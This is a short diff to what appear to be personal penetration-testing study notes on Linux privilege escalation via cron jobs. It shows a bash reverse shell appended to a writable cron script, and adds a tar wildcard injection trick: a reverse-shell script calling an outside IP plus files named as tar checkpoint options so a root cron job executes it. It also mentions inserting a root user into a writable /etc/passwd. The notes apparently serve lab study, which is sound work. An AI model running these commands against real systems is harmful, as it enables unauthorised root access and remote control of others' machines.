@@ -15,6 +15,13 @@ If we can edit then go ahead and pop a reverse shell in there:
 ```bash
 echo "bash -c 'bash -i >& /dev/tcp/<OurIP>/4444 0>&1'" >> cronjobbin_all_day_long.sh
 ```
+If we happen to clock a cronjob running something with a wildcard then remember to consider the possibility of some parameter injection. If the command happens to be `tar` then its super easy, one from the labs:
+```bash
+cd /dir/being/targeted/by/wildcardin/tar/cronjob
+echo 'bash -c "bash -i >& /dev/tcp/192.168.45.xx/4448 0>&1"' > shell.sh
+echo "" > '--checkpoint=1'
+echo "" > '--checkpoint-action=exec=sh shell.sh'
+```
 
 ### /etc/passwd
 If for some ridiculous reason `/etc/passwd` is writable by a user we can execute commands as, we have an easy path to privesc by inserting a new root user in there:
